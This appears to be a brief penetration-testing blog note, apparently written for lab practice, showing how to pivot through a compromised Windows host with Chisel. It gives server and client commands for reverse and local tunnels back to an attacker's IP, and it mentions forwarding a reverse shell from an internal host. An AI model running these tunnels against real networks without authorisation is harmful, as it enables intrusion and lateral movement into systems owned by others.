---
layout: post
title: Pivoting with Chisel
description: Pivoting with Chisel
date: 2022-04-29
Last Updated: 
---
<!-- markdown-link-check-disable -->
# Pivoting with Chisel

## Reverse Pivot

(sends traffic back to kali via tunnel)

Kali -> victim -> network host

* Attack host spins up reverse listener
* Victim sets up tunnel back to listener port on attack box and also links between intermediate client and remote target
* Allows connection from Kali (127.0.0.1:8001) via tunnel to port 80 on remote host

On attack box:

```
[root@kali:/r/t/chisel]# ./chisel server -p 8000 -v -reverse
```

On intermediate target:

```
C:\Users\offsec\Documents>chisel.exe client 192.168.119.163:8000 R:8001:172.16.163.5:80
```

![](</assets/images/Reverse_Pivot_1.png>) ![](</assets/images/Reverse_Pivot_2.png>)

## Local Pivot

(sends traffic to client and then back to kali)



Kali > victim < network host

* Attack host spins up listener
* Victim sets up tunnel back to listener port on attack box and also opens listener on localhost
* Hosts can send traffic (rev shell) back to listener on victim which gets directed back to attack host

On attack box:

```
[root@kali:/r/t/chisel]# ./chisel server -p 8000 -v
```

On intermediate target:

```
C:\Users\offsec\Documents>chisel.exe client 192.168.119.163:8000 9001:127.0.0.1:8001
```

On Remote host execute payload with IP of client and it will get forwarded to attack box

![](</assets/images/Local_Pivot_1.png>)![](</assets/images/Local_Pivot_2.png>)![](</assets/images/Local_Pivot_3.png>)

<!-- markdown-link-check-enable -->